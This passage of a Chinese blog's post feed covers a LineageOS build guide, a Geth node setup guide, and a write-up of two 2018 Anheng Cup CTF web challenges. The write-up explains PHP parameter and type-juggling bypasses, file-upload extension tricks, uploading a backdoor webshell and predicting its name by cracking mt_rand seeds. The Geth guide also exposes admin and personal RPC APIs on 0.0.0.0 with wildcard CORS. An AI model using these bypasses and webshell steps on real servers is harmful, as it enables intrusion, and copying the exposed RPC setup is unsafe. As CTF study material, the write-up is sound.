title="其他问题"></a>其他问题</h2><p>包括什么时候可以实习？以后想做哪一块，web or bin？（我也不知道既然凉了为啥要问这种问题Orz）？有什么想要问面试官的？</p>]]></content>
      
      
      <categories>
          
          <category> 面经 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web安全 </tag>
            
            <tag> 面经 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>LineageOS源代码编译笔记</title>
      <link href="/android-LineageOS%E6%BA%90%E4%BB%A3%E7%A0%81%E7%BC%96%E8%AF%91%E7%AC%94%E8%AE%B0/"/>
      <url>/android-LineageOS%E6%BA%90%E4%BB%A3%E7%A0%81%E7%BC%96%E8%AF%91%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<p>在研究安卓安全时，很多情况下我们需要修改安卓源代码（如动态调试时过掉反调试机制）。LineageOS是根据Android官方源码修改后的版本，对很多手机都适配，因此编译该版本的源码比直接编译AOSP的更加有意义。本文简要说明一下编译LineageOS的步骤。更详细的步骤说明请参考官方文档: <a href="https://wiki.lineageos.org/build_guides.html" target="_blank" rel="noopener">https://wiki.lineageos.org/build_guides.html</a></p><a id="more"></a><p>首先说明一下我这的操作系统和需要编译的LineageOS版本<br>操作系统版本：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Linux anemone-VirtualBox 4.13.0-26-generic <span class="comment">#29~16.04.2-Ubuntu SMP Tue Jan 9 22:00:44 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux</span></span><br></pre></td></tr></table></figure></p><p>编译的LineageOS版本<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">============================================</span><br><span class="line">PLATFORM_VERSION_CODENAME=REL</span><br><span class="line">PLATFORM_VERSION=7.1.2</span><br><span class="line">LINEAGE_VERSION=14.1-20180325-UNOFFICIAL-mako</span><br><span class="line">TARGET_PRODUCT=lineage_mako</span><br><span class="line">TARGET_BUILD_VARIANT=userdebug</span><br><span class="line">TARGET_BUILD_TYPE=release</span><br><span class="line">TARGET_BUILD_APPS=</span><br><span class="line">TARGET_ARCH=arm</span><br><span class="line">TARGET_ARCH_VARIANT=armv7<span class="_">-a</span>-neon</span><br><span class="line">TARGET_CPU_VARIANT=krait</span><br><span class="line">TARGET_2ND_ARCH=</span><br><span class="line">TARGET_2ND_ARCH_VARIANT=</span><br><span class="line">TARGET_2ND_CPU_VARIANT=</span><br><span class="line">HOST_ARCH=x86_64</span><br><span class="line">HOST_2ND_ARCH=x86</span><br><span class="line">HOST_OS=linux</span><br><span class="line">HOST_OS_EXTRA=Linux-4.13.0-26-generic-x86_64-with-Ubuntu-16.04-xenial</span><br><span class="line">HOST_CROSS_OS=windows</span><br><span class="line">HOST_CROSS_ARCH=x86</span><br><span class="line">HOST_CROSS_2ND_ARCH=x86_64</span><br><span class="line">HOST_BUILD_TYPE=release</span><br><span class="line">BUILD_ID=NJH47F</span><br><span class="line">OUT_DIR=/media/anemone/lineage/lineageOS/out</span><br><span class="line">WITH_SU=<span class="literal">true</span></span><br><span class="line">============================================</span><br></pre></td></tr></table></figure></p><p>顺带可以看到我这里需要编译的Android版本是7.1.1, 目标设备是Nexus4手机。</p><h1 id="搭建编译环境"><a href="#搭建编译环境" class="headerlink" title="搭建编译环境"></a>搭建编译环境</h1><p>安装jdk<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install openjdk-8-jdk</span><br></pre></td></tr></table></figure></p><p>安装编译时需要依赖的库<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install bc bison build-essential curl flex g++-multilib gcc-multilib git gnupg gperf imagemagick lib32ncurses5-dev lib32z1-dev libesd0-dev liblz4-tool libncurses5-dev libsdl1.2-dev libwxgtk3.0-dev libxml2 libxml2-utils lzop pngcrush schedtool squashfs-tools xsltproc zip zlib1g-dev openjdk-8-jdk lib32readline6-dev</span><br></pre></td></tr></table></figure></p><h1 id="下载源代码"><a href="#下载源代码" class="headerlink" title="下载源代码"></a>下载源代码</h1><p>安装repo工具<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl https://mirrors.tuna.tsinghua.edu.cn/git/git-repo -o repo</span><br><span class="line">chmod +x repo</span><br></pre></td></tr></table></figure></p><p>为了方便可以将其拷贝到你的PATH里。</p><p>使用repo命令下载源代码（可能涉及到科学上网）<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">repo init -u git://github.com/LineageOS/android.git -b cm-14.1</span><br><span class="line">repo sync -f --force-sync --no-clone-bundle</span><br></pre></td></tr></table></figure></p><h1 id="提取设备文件"><a href="#提取设备文件" class="headerlink" title="提取设备文件"></a>提取设备文件</h1><p>虽然Android是开源的，但是有些设备的文件不是通用的（如不开源的驱动文件），有2种方法提取：1，从刷好相同版本的LineageOS设备中获取，2，从已经编译好的LineageOS卡刷包中获取。这里介绍第二种，假设我们已经下好的卡刷包为<code>path/to/lineage-xxx.zip</code>。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mkdir ~/android/system_dump/</span><br><span class="line"><span class="built_in">cd</span> ~/android/system_dump/</span><br><span class="line">unzip path/to/lineage-*.zip system.transfer.list system.new.dat</span><br><span class="line">git <span class="built_in">clone</span> https://github.com/xpirt/sdat2img</span><br><span class="line">python sdat2img/sdat2img.py system.transfer.list system.new.dat system.img</span><br><span class="line">mkdir system/</span><br><span class="line">sudo mount system.img system/</span><br><span class="line">./extract-files.sh ~/android/system_dump/</span><br></pre></td></tr></table></figure><p>将system_dump文件下的文件复制到<code>~/android/lineage/vendor/lge</code>文件夹下。</p><h1 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h1><p>准备工作做完后就可以开始愉快的编译啦~~，不过在由于Android工程巨大，请确保编译的机器拥有不低于10G的内存(亲测虚拟机内存8G，swap 8G可以编译)，一个速度足够快的硬盘（再来一个固态当缓冲就更好啦），当然还有一个好的CPU（我这用的是i7-4700HQ, 应该算比较差的编译环境了，整个编译过程需要3个小时）。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">. build/envsetup.sh</span><br><span class="line"><span class="built_in">export</span> WITH_SU=<span class="literal">true</span>    <span class="comment">#自带root</span></span><br><span class="line"><span class="built_in">export</span> JACK_SERVER_VM_ARGUMENTS=<span class="string">"-Dfile.encoding=UTF-8 -XX:+TieredCompilation -Xmx10G"</span>    <span class="comment">#设置编译内存</span></span><br><span class="line">breakfast lineage_mako-userdebug <span class="comment">#选择设备内核</span></span><br><span class="line"><span class="built_in">export</span> USE_CCACHE=1 <span class="comment">#使用缓存</span></span><br><span class="line"><span class="built_in">export</span> CCACHE_DIR=/media/anemone/anemone_ssk/ccache <span class="comment">#缓存地址</span></span><br><span class="line">./prebuilts/misc/linux-x86/ccache/ccache  -M 100G    <span class="comment">#使用100G作为缓存空间</span></span><br><span class="line">brunch lineage_mako-userdebug</span><br></pre></td></tr></table></figure></p>]]></content>
      
      
      <categories>
          
          <category> Android </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Android </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Geth搭建公有节点or私有链节点</title>
      <link href="/%E5%8C%BA%E5%9D%97%E9%93%BE-Geth%E6%90%AD%E5%BB%BA%E5%85%AC%E6%9C%89%E8%8A%82%E7%82%B9or%E7%A7%81%E6%9C%89%E9%93%BE/"/>
      <url>/%E5%8C%BA%E5%9D%97%E9%93%BE-Geth%E6%90%AD%E5%BB%BA%E5%85%AC%E6%9C%89%E8%8A%82%E7%82%B9or%E7%A7%81%E6%9C%89%E9%93%BE/</url>
      
        <content type="html"><![CDATA[<h1 id="Geth搭建公有节点"><a href="#Geth搭建公有节点" class="headerlink" title="Geth搭建公有节点"></a>Geth搭建公有节点</h1><p>Geth搭建公有节点主要是因为实验室有获取区块数据这一需求，因此这里记录一下如何建立一个公有链节点并暴露其json-rpc供其他人调用：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">geth --syncmode=light --datadir <span class="string">"./public_chain"</span>  --rpc --rpcaddr <span class="string">"127.0.0.1"</span>  --rpcport <span class="string">"8545"</span></span><br></pre></td></tr></table></figure><a id="more"></a><ul><li><p>—syncmode=light：仅获取当前状态，需要其他信息向其他full节点请求（其他模式还有：full——全节点模式，下载所有区块header&amp;body，并且验证，fast——快速模式，下载所有区块，但不验证）</p></li><li><p>—datadir “./public_chain”：保存数据在”./public_chain”</p></li><li><p>—rpc -rpcaddr “127.0.0.1”  —rpcport “8545”：开放127.0.0.1:8545的JSON-RPC访问</p></li></ul><p>尝试RPC访问</p><p>查询版本：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ curl -H <span class="string">"Content-Type: application/json"</span> -X POST  --data <span class="string">'&#123;"jsonrpc":"2.0","method":"web3_clientVersion","params":[],"id":67&#125;'</span> http://127.0.0.1:8545</span><br><span class="line">&#123;<span class="string">"jsonrpc"</span>:<span class="string">"2.0"</span>,<span class="string">"id"</span>:67,<span class="string">"result"</span>:<span class="string">"Geth/v1.8.13-stable-225171a4/windows-amd64/go1.10.3"</span>&#125;</span><br></pre></td></tr></table></figure><p>查询区块：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ curl -H <span class="string">"Content-Type: application/json"</span> -X POST  --data <span class="string">'&#123;"jsonrpc":"2.0","method":"eth_syncing","params":[],"id":1&#125;'</span> http://127.0.0.1:8545</span><br><span class="line">&#123;<span class="string">"jsonrpc"</span>:<span class="string">"2.0"</span>,<span class="string">"id"</span>:1,<span class="string">"result"</span>:&#123;<span class="string">"currentBlock"</span>:<span class="string">"0x6a563f"</span>,<span class="string">"highestBlock"</span>:<span class="string">"0x6a9987"</span>,<span class="string">"knownStates"</span>:<span class="string">"0x0"</span>,<span class="string">"pulledStates"</span>:<span class="string">"0x0"</span>,<span class="string">"startingBlock"</span>:<span class="string">"0x687fff"</span>&#125;&#125;</span><br></pre></td></tr></table></figure><p>详细API请参阅<a href="https://github.com/ethereum/wiki/wiki/JSON-RPC#json-rpc-api" target="_blank" rel="noopener">https://github.com/ethereum/wiki/wiki/JSON-RPC#json-rpc-api</a></p><p>如果没有区块信息需要将static-nodes.json放在chain_data目录下：</p><p><a href="https://ethfans.org/wikis/%E6%98%9F%E7%81%AB%E8%8A%82%E7%82%B9%E8%AE%A1%E5%88%92%E8%B6%85%E7%BA%A7%E8%8A%82%E7%82%B9%E5%88%97%E8%A1%A8" target="_blank" rel="noopener">https://ethfans.org/wikis/%E6%98%9F%E7%81%AB%E8%8A%82%E7%82%B9%E8%AE%A1%E5%88%92%E8%B6%85%E7%BA%A7%E8%8A%82%E7%82%B9%E5%88%97%E8%A1%A8</a></p><h1 id="Geth搭建私有链"><a href="#Geth搭建私有链" class="headerlink" title="Geth搭建私有链"></a>Geth搭建私有链</h1><p>目前网上写的私有链搭建的步骤均没有介绍如何初始化账户及初始金额的问题，本文记录一下使用Geth构造一个私有链的完整步骤。</p><h2 id="0x01-创建新账户"><a href="#0x01-创建新账户" class="headerlink" title="0x01 创建新账户"></a>0x01 创建新账户</h2><p>如果需要在私有链上初始化一些账户以及给这些账户发放一定数量的以太币，就需要新建一些账户。使用<code>account new</code>命令新建账户：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$ mkdir testchain<span class="comment"># 新建一个文件夹放置数据</span></span><br><span class="line">$ geth --datadir <span class="string">"./testchain"</span> account new<span class="comment"># 新建账户，需要设置密码</span></span><br><span class="line">WARN [10-23|20:08:07] No etherbase <span class="built_in">set</span> and no accounts found as default</span><br><span class="line">Your new account is locked with a password. Please give a password. Do not forget this password.</span><br><span class="line">Passphrase:</span><br><span class="line">Repeat passphrase:</span><br><span class="line">Address: &#123;28c67f4a957fcd814effce00863eb3aeb9e9884a&#125;</span><br><span class="line">$ ls ./testchain</span><br><span class="line">keystore</span><br><span class="line">$ ls ./testchain/keystore/<span class="comment"># 账户文件</span></span><br><span class="line">UTC--2018-10-23T12-08-15.951611300Z--28c67f4a957fcd814effce00863eb3aeb9e9884a</span><br></pre></td></tr></table></figure><h2 id="0x02-编写配置文件"><a href="#0x02-编写配置文件" class="headerlink" title="0x02 编写配置文件"></a>0x02 编写配置文件</h2><p>在<code>testchain</code>目录下新建<code>genesis.json</code>文件，内容如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;config&quot;:&#123;</span><br><span class="line">        &quot;homesteadBlock&quot;:0</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;nonce&quot;: &quot;0x0000000000000042&quot;,</span><br><span class="line">    &quot;timestamp&quot;: &quot;0x0&quot;,</span><br><span class="line">    &quot;parentHash&quot;: &quot;0x0000000000000000000000000000000000000000000000000000000000000000&quot;,</span><br><span class="line">    &quot;extraData&quot;: &quot;0x&quot;,</span><br><span class="line">    &quot;gasLimit&quot;: &quot;0x8000000000000000&quot;,</span><br><span class="line">    &quot;difficulty&quot;: &quot;0x02&quot;,</span><br><span class="line">    &quot;mixhash&quot;: &quot;0x0000000000000000000000000000000000000000000000000000000000000000&quot;,</span><br><span class="line">    &quot;coinbase&quot;: &quot;0x28c67f4a957fcd814effce00863eb3aeb9e9884a&quot;,</span><br><span class="line">    &quot;alloc&quot;: &#123;</span><br><span class="line">        &quot;0x28c67f4a957fcd814effce00863eb3aeb9e9884a&quot;:&#123;&quot;balance&quot;:&quot;2000000000000000000000000&quot;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中，<code>coinbase</code>指挖矿的报酬发送到的账户，<code>alloc</code>指初始化账户及其初始金额，注意这里的地址都需要是新建的账户；<code>difficulty</code>指挖矿难度，<code>gasLimit</code>指一个区块中的Gas限制，即打包区块时所有的交易Gas花费不得超过该值。</p><h2 id="0x03-使用命令构造创始块"><a href="#0x03-使用命令构造创始块" class="headerlink" title="0x03 使用命令构造创始块"></a>0x03 使用命令构造创始块</h2><p>若文件夹下有旧区块信息需要先删除：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">geth --datadir <span class="string">"./testchain"</span> removedb</span><br></pre></td></tr></table></figure><p>使用genesis.json创建创始块</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">geth --datadir <span class="string">"./testchain"</span> init ./testchain/genesis.json</span><br></pre></td></tr></table></figure><h2 id="0x04-启动节点"><a href="#0x04-启动节点" class="headerlink" title="0x04 启动节点"></a>0x04 启动节点</h2><p>创始块完成后可以使用geth启动节点并开始挖矿了，具体命令如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">geth --syncmode=full  --identity <span class="string">"TestNode0"</span> --rpc -rpcaddr <span class="string">"0.0.0.0"</span>  --rpcport <span class="string">"8545"</span> --rpccorsdomain <span class="string">"*"</span> --port <span class="string">"30303"</span> --nodiscover  --rpcapi <span class="string">"db,eth,net,web3,miner,net,personal,net,txpool,admin,debug"</span>  --networkid 1900   --datadir <span class="string">"./testchain"</span> --nat <span class="string">"any"</span> --mine --minerthreads <span class="string">"1"</span></span><br></pre></td></tr></table></figure><p>其中一些重要参数的含义为：</p><ul><li><p>—identity：节点名称</p></li><li><p>—rpc -rpcaddr “0.0.0.0” —rpcport “8545”：节点开放rpc连接，监听地址为0.0.0.0:8545</p></li><li><p>—rpcapi：rpc提供的api类型</p></li><li><p>—rpccorsdomain：rpc允许接入本节点的网段，分号隔开</p></li><li><p>—port：节点间联系使用的端口号</p></li><li><p>—networkid：区块链的网络号，唯一的标识一条区块链，比如说1=主链, 3=Ropsten测试链, 4=Rinkeby测试链</p></li><li>—mine —minerthreads 1：启动挖矿，开放1个线程</li></ul><p>启动节点后，一条私有链就可以使用了，即可以连接该节点发布智能合约，或者发起新的交易。</p><p>例如：连接节点，查看账户</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$ geth attach http://localhost:8545</span><br><span class="line">Welcome to the Geth JavaScript console!</span><br><span class="line"></span><br><span class="line">instance: Geth/TestNode0/v1.7.0-unstable/linux-amd64/go1.10.1</span><br><span class="line">coinbase: 0x28c67f4a957fcd814effce00863eb3aeb9e9884a</span><br><span class="line">at block: 13 (Tue, 23 Oct 2018 20:55:04 DST)</span><br><span class="line"> datadir: /home/anemone/testchain</span><br><span class="line"> modules: admin:1.0 debug:1.0 eth:1.0 miner:1.0 net:1.0 personal:1.0 rpc:1.0 txpool:1.0 web3:1.0</span><br><span class="line"></span><br><span class="line">&gt; eth.accounts</span><br><span class="line">[<span class="string">"0x28c67f4a957fcd814effce00863eb3aeb9e9884a"</span>]</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 区块链 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 区块链 </tag>
            
            <tag> Geth </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2018“安恒杯”WEB安全测试秋季资格赛wp</title>
      <link href="/ctf-2018%E2%80%9C%E5%AE%89%E6%81%92%E6%9D%AF%E2%80%9DWEB%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E7%A7%8B%E5%AD%A3%E8%B5%84%E6%A0%BC%E8%B5%9Bwp/"/>
      <url>/ctf-2018%E2%80%9C%E5%AE%89%E6%81%92%E6%9D%AF%E2%80%9DWEB%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E7%A7%8B%E5%AD%A3%E8%B5%84%E6%A0%BC%E8%B5%9Bwp/</url>
      
        <content type="html"><![CDATA[<p>2018“安恒杯”WEB安全测试秋季资格赛，被老板批评“只会写文档的黑客”后，赶快刷几题找回点自信Orz。</p><h1 id="奇怪的恐龙特性"><a href="#奇怪的恐龙特性" class="headerlink" title="奇怪的恐龙特性"></a>奇怪的恐龙特性</h1><p>进入靶机，可以看到网页源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>); </span><br><span class="line">ini_set(<span class="string">"display_error"</span>, <span class="keyword">false</span>);  </span><br><span class="line">error_reporting(<span class="number">0</span>);  </span><br><span class="line">$str = <span class="keyword">isset</span>($_GET[<span class="string">'A_A'</span>])?$_GET[<span class="string">'A_A'</span>]:<span class="string">'A_A'</span>; </span><br><span class="line"><span class="keyword">if</span> (strpos($_SERVER[<span class="string">'QUERY_STRING'</span>], <span class="string">"A_A"</span>) !==<span class="keyword">false</span>) &#123; </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'A_A,have fun'</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">elseif</span> ($str&lt;<span class="number">9999999999</span>) &#123; </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'A_A,too small'</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">elseif</span> ((string)$str&gt;<span class="number">0</span>) &#123; </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'A_A,too big'</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">else</span>&#123; </span><br><span class="line">    <span class="keyword">echo</span> file_get_contents(<span class="string">'flag.php'</span>); </span><br><span class="line">     </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"> <span class="meta">?&gt;</span> A_A,too small</span><br></pre></td></tr></table></figure><a id="more"></a><p>首先要绕过<code>isset($_GET[&#39;A_A&#39;]) &amp;&amp; strpos($_SERVER[&#39;QUERY_STRING&#39;], &quot;A_A&quot;)</code>，表面上说我们需要生成一个GET请求并且参数为A_A，但是第二个判断有要求GET请求的参数不能为A_A，看起来这是不可能的，但是由于PHP特性，会自动替换<code>.</code>为<code>_</code>，因此我们可以构造 <a href="http://ip/?A.A=xxx来绕过这个判断。" target="_blank" rel="noopener">http://ip/?A.A=xxx来绕过这个判断。</a></p><p>接着我们需要绕过后面两个对$str的判断，即保证<code>$str&lt;9999999999 || (string)$str&gt;0==false</code>，这看起来写是不可能，但是在PHP中，我们可以使$str为一个数组，由于类型不同无法判断/强制转化，因此这样两个判断就都不成立了，这样我们就可以开心的getflag了。最后的GET请求为<code>http://114.55.36.69:8022/?A.A[]=1</code></p><h1 id="ping也能把你ping挂"><a href="#ping也能把你ping挂" class="headerlink" title="ping也能把你ping挂"></a>ping也能把你ping挂</h1><h2 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h2><p>进入靶机，跳转到ping的页面，猜测有命令注入的问题</p><p><img src="/ctf-2018“安恒杯”WEB安全测试秋季资格赛wp/1537705876135.png" alt="1537705876135"></p><p>尝试后发现<code>;</code>，空格被过滤，并且长度存在限制，这样我们只能用ls先看下当前目录有啥东西了：</p><p><img src="/ctf-2018“安恒杯”WEB安全测试秋季资格赛wp/1537705979278.png" alt="1537705979278"></p><p>这里我们发现了上传入口：you_find_upload.php。</p><h2 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h2><p>进入<a href="http://114.55.36.69:6664/you_find_upload.php，看到可以查看源码，那就点进去查看吧" target="_blank" rel="noopener">http://114.55.36.69:6664/you_find_upload.php，看到可以查看源码，那就点进去查看吧</a></p><p><img src="/ctf-2018“安恒杯”WEB安全测试秋季资格赛wp/1537706140903.png" alt="1537706140903"></p><p>前面那一串数字先不管，将后面的base64解码，得到上传的源代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$type = <span class="keyword">array</span>(<span class="string">'gif'</span>,<span class="string">'jpg'</span>,<span class="string">'png'</span>);</span><br><span class="line">mt_srand((time() % rand(<span class="number">1</span>,<span class="number">100000</span>)%rand(<span class="number">1000</span>,<span class="number">9000</span>)));</span><br><span class="line"><span class="keyword">echo</span> mt_rand();</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    $check = getimagesize($FILES<span class="string">'file'</span>);</span><br><span class="line">    @$extension = end(explode(<span class="string">'.'</span>,$FILES<span class="string">'file'</span>));</span><br><span class="line">    <span class="keyword">if</span>(in_array($extension,$type))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'File is an image - '</span> . $check[<span class="string">'mime'</span>];</span><br><span class="line">        $filename = mt_rand().<span class="string">''</span>.$FILES<span class="string">'file'</span>;</span><br><span class="line">        move_uploaded_file($FILES<span class="string">'file'</span>, $filename);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;br&gt;\n"</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"File is not an image"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($GET[<span class="string">'p'</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(@preg_match(<span class="string">"/..\//"</span>,$GET[<span class="string">'p'</span>]))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"你这个孩子，too young too simple"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">       @<span class="keyword">include</span> $_GET[<span class="string">'p'</span>].<span class="string">".php"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h2><p>首先我们需要绕过文件类型限制，<code>in_array($extension,$type)</code>表示我们得上传后缀是gif，jpg或png的文件，这里复习一下上传绕过的普通套路：</p><ol><li><p>Apache</p><p>1.php.jpg #从apache从右往左，直到可解析的文件后缀</p></li><li><p>Nginx</p><p>1.php%001.jpg #00处截断</p></li><li><p>IIS</p><p>a.asp;jpg    </p><p>a.php. 和a.php[空格] #会自动去掉空格</p></li></ol><p>注意到这里用的是Apache容器，那我们就上传个backdoor.php.jpg文件就好了</p><p><img src="/ctf-2018“安恒杯”WEB安全测试秋季资格赛wp/1537706584108.png" alt="1537706584108"></p><p>看到这里我们已经上传成功了</p><h2 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h2><p>接下来我们需要确定上传后的文件名，再次查看源码，点击上传后，程序首先使用<code>mt_srand((time() % rand(1,100000)%rand(1000,9000)));</code>设置了随机数种子，并且打印第一个随机数<code>echo mt_rand();</code>；而上传文件名就是第二个随机数+原本文件名<code>$filename = mt_rand().&#39;&#39;.$FILES&#39;file&#39;;</code>，这样的伪随机数是存在问题的，我们可以根据第一个随机数暴力破解出随机数种子（注意到这里的种子∈[1000,9000]），然后再计算出第二个随机数。</p><p>以第3步的上传结果为例，使用php_mt_seed.exe计算出随机数种子为5240.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">λ php_mt_seed.exe 823735129</span><br><span class="line">Found 0, trying 0 - 33554431, speed 0 seeds per second</span><br><span class="line">seed = 5240</span><br><span class="line">Found 1, trying 67108864 - 100663295, speed 71014670 seeds per second</span><br></pre></td></tr></table></figure><p>接着推测出第二个随机数：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">λ cat test.php</span><br><span class="line">&lt;?php</span><br><span class="line">mt_srand(5240);</span><br><span class="line"><span class="built_in">echo</span> mt_rand();</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"\n"</span>;</span><br><span class="line"><span class="built_in">echo</span> mt_rand();</span><br><span class="line">?&gt;</span><br><span class="line">λ php test.php</span><br><span class="line">823735129</span><br><span class="line">288373614</span><br></pre></td></tr></table></figure><p>那么我们的文件名就是288373614_backdoor.php.jpg</p><p>后面就可以连菜刀<a 